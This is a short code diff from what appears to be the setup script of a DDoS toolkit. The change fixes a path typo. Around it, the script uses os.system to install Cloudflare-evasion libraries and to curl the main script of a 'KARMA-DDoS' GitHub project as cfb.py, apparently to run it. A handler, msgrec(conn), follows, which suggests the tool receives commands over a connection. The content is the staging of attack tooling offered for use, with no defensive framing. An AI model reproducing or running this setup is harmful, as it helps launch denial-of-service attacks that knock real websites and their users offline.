@@ -11,7 +11,7 @@ os.system("yum update -y && yum install nodejs -y && yum install python3 -y")
 os.system("npm i minimist cloudscraper")
 os.system("pip3 install cloudscraper socks pysocks colorama undetected_chromedriver httpx")
 
-os.system("curl -o resouces/ua.txt https://raw.githubusercontent.com/HyukIsBack/KARMA-DDoS/main/resources/ua.txt")
+os.system("curl -o resources/ua.txt https://raw.githubusercontent.com/HyukIsBack/KARMA-DDoS/main/resources/ua.txt")
 os.system("curl -o cfb.py https://raw.githubusercontent.com/HyukIsBack/KARMA-DDoS/main/main.py")
 
 def msgrec(conn):
